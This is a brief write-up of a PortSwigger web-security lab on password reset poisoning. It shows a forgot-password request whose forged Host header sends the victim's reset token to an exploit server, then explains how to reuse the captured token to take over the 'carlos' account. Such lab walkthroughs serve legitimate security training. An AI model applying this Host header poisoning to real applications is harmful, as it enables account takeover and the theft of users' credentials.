# Basic password reset poisoning — (PortSwigger — Apprentice)
**Date:** 2026-08-10
 
---
 
## Vulnerability / core concept
Password Reset Poisoning via HTTP Host Header Attack

---


## Payload / key command
This web application has a `Forgot password` functionality, which sends a unique token to users' mail so they can change their password. However, the validation of `Host` header is insecure and leads to password reset poisoning attack.

We should send the following request:
```bash
POST /forgot-password HTTP/2
Host: exploit-0a4e0017037fb9f181ffa61e01e40064.exploit-server.net/exploit
...

csrf=...&username=carlos
```
This request will send a password reset link to `carlos`'s email address. However, the password reset token will be concatenated to our malicious exploit server, which allows us to see its logs. When we check the logs of our malicious website we can see that we got the reset token of `carlos`. Now all we need to do is to try reset our own account password, get the link and press it. When we open the link, we need to change the token from ours to the extracted one from exploit. This way we can change the password or `carlos` and log in to solve this lab.

